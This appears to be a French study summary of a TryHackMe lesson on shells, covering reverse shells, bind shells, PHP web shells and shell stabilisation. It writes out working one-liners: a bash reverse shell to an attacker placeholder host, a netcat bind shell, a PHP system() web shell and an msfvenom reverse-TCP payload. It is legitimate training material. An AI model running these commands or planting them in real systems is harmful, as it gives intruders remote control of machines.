
# 🐚 Vue d'ensemble des Shells 🐚

> Ce document est une synthèse du module *Shells Overview* de TryHackMe, rédigée en français. Il couvre les différents types de shells utilisés en sécurité offensive, leurs différences et leurs cas d'utilisation.

---

## 🎯 Objectifs d'apprentissage

* Comprendre les shells en sécurité offensive
* Configurer et utiliser des shells inversés et des shells liés
* Déployer des web shells

---

## 📚 Prérequis

* Compréhension de base des réseaux
* Connaissances fondamentales en sécurité des applications web
* Maîtrise de base de la ligne de commande
* Familiarité avec des langages de script comme Bash, Python ou PHP

---

## 🐚 Qu'est-ce qu'un Shell ?

Un shell est un logiciel qui permet à un utilisateur d'interagir avec un système d'exploitation. Il peut s'agir d'une interface graphique, mais il s'agit généralement d'une interface en ligne de commande.

En cybersécurité, un shell fait référence à une session spécifique qu'un attaquant utilise lorsqu'il accède à un système compromis, lui permettant d'exécuter des commandes et des logiciels.

---

## 🔄 Shell Inversé (Reverse Shell)

Un shell inversé, parfois appelé "connect back shell", est l'une des techniques les plus populaires pour obtenir un accès à un système lors de cyberattaques. Les connexions sont initiées depuis le système cible vers la machine de l'attaquant, ce qui peut aider à éviter la détection par les pare-feu et autres dispositifs de sécurité réseau.

### 🛠️ Configuration d'un écouteur Netcat (nc)

Pour comprendre comment fonctionne un shell inversé, utilisons l'outil Netcat. Cet utilitaire prend en charge plusieurs systèmes d'exploitation et permet la lecture et l'écriture via un réseau.

Comme mentionné précédemment, un shell inversé se connectera à la machine de l'attaquant. Cette machine attendra une connexion, donc utilisons Netcat pour écouter une connexion en utilisant la commande suivante :

```bash
nc -lvnp 443
```

Sur la machine cible, une commande typique pour établir un shell inversé pourrait ressembler à ceci :

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

---

## 🔗 Shell Lié (Bind Shell)

Un shell lié est une technique où la machine cible écoute sur un port spécifique, attendant une connexion entrante de l'attaquant. Contrairement au shell inversé, c'est l'attaquant qui initie la connexion vers la machine cible.

### 🛠️ Configuration d'un shell lié avec Netcat

Sur la machine cible, pour écouter sur un port spécifique et exécuter un shell, la commande pourrait être :

```bash
nc -lvnp 4444 -e /bin/bash
```

Ensuite, sur la machine de l'attaquant, pour se connecter au shell lié :

```bash
nc TARGET_IP 4444
```

---

## 🌐 Web Shells

Un web shell est un script malveillant téléchargé sur un serveur web, permettant à un attaquant d'exécuter des commandes sur le serveur via une interface web. Ils sont souvent écrits en PHP, ASP ou d'autres langages de script côté serveur.

### 🛠️ Exemple de web shell PHP simple

```php
<?php system($_GET['cmd']); ?>
```

En accédant à ce script via un navigateur avec une URL comme `http://target.com/shell.php?cmd=whoami`, l'attaquant peut exécuter des commandes sur le serveur.

---

## 🛡️ Stabilisation des Shells

Les shells obtenus via des connexions réseau peuvent être instables ou limités. Voici quelques techniques pour stabiliser une session shell :

* **Utiliser Python pour obtenir un shell interactif** :

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

* **Utiliser `stty` pour configurer le terminal** :

```bash
stty raw -echo; fg
```

* **Utiliser `rlwrap` pour améliorer l'expérience du shell** :

```bash
rlwrap nc -lvnp 443
```

---

## 🧰 Outils et Payloads Communs

* **Netcat** : Outil polyvalent pour établir des connexions réseau, utilisé pour les shells inversés et liés.

* **Socat** : Outil similaire à Netcat mais avec plus de fonctionnalités, utile pour établir des connexions chiffrées et des shells plus stables.

* **Msfvenom** : Outil du framework Metasploit pour générer des payloads personnalisés.

  Exemple de génération d'un payload shell inversé pour Linux :

  ```bash
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf -o shell.elf
  ```

---

## 🧠 Concepts Clés

* **Shell** : Interface en ligne de commande permettant d'interagir avec un système d'exploitation.

* **Shell Inversé** : Connexion initiée depuis la machine cible vers l'attaquant.

* **Shell Lié** : Connexion initiée depuis l'attaquant vers la machine cible.

* **Web Shell** : Script malveillant sur un serveur web permettant l'exécution de commandes.

* **Stabilisation de Shell** : Techniques pour améliorer l'interactivité et la stabilité d'une session shell.
